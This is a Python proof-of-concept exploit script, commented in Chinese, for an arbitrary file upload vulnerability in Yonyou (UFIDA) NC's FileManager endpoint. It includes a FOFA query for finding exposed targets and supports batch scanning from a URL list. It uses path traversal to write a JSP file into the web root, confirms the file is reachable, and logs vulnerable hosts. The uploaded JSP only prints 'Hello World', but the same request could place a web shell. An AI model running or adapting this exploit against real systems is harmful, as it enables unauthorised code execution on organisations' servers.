#用友 NC FileManager 文件上传
#FOFA语法：app="用友-UFIDA-NC"
import sys,requests,argparse
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool

def main():
    parse = argparse.ArgumentParser(description='用友 NC FileManager 文件上传')
    parse.add_argument('-u','--url',dest='url',type=str,help='输入url')
    parse.add_argument('-f','--file',dest='file',type=str,help='输入file')
    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        list=[]
        with open(args.file,'r',encoding='utf-8') as p:
            for line in p.readlines():
                list.append(line.strip())
            mp =Pool(1)
            mp.map(poc,list)
            mp.close()
            mp.join()
    else:
        pass

def poc(target):
    headers={'User-Agent':'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
             'Connection':'close',
            'Content-Disposition':'form-data; name="file"; filename="te1st.jsp" ',
            'Content-Type':'text/plain'
    }
    headers2={'User-Agent':'Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36'}

    payload='/portal/pt/file/upload?pageId=login&filemanager=nc.uap.lfw.file.FileManager&iscover=true&billitem=..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5C..%5Cwebapps%5Cnc_web%5C'
    data='<%out.print("Hello World");%>'
    
    proxy = {
    'http': 'http://127.0.0.1:7890',
    'https': 'http://127.0.0.1:7890'
}
    try:
        res1=requests.post(url=target+payload,proxies=proxy,verify=False,headers=headers,data=data,timeout=10)
        # print(res1.text)
        if res1.status_code==200:
            res2 =requests.get(url=target+'/te1st.jsp',headers=headers2,verify=False,proxies=proxy)
            if 'Hello World' in res2.text:
                print(target+'存在文件上传')
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(target+'\n')
    except Exception as e:
        pass


if __name__=='__main__':
    main()